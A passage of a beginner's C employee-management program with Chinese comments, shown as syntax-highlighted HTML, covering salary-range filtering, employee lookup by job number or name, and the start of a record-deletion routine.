function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要筛选的员工薪资范围\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.低薪    \t\t     2.中薪\t\t\t  3.高薪\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">3000</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">3000</span><span class="token operator">&amp;&amp;</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8000</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">8000</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"你好像想查询什么奇奇怪怪的东西！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_3_1</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token comment">//以员工号方式查询某个员工的信息。</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> found<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n请输入你要查询的职工的职工号："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> found<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>found<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"没有该员工！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_3</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token comment">//以员工号方式查询某个员工的信息。</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> found<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n请输入你要查询的职工的职工号："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> found<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>found<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"没有该员工！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_3_2</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//以姓名方式查找员工；</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> found<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n请输入你要查询的职工的姓名："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> found<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>found<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token comment">//用found数组进行比较如果found数组和name相同则执行；</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">100</span><span class="token punctuation">)</span>        <span class="token comment">//当</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"没有该员工！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">f_4</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">)</span><span class="token comment">//删除数据；</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> find<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NUM<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要删除的职工号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>find<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;=</span>NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>find<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            NUM<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token comment">//将num--这个操作，更改变量的大小，方便再次存入。</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>NUM<span class="token operator">&lt;</span>j<span class="token punctuation">)</span>        <span class="token comment">//如果没有提前结束，j的最终大小回是num+1;判断num是否及时结束。</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"该职工号不存在！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>find<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token 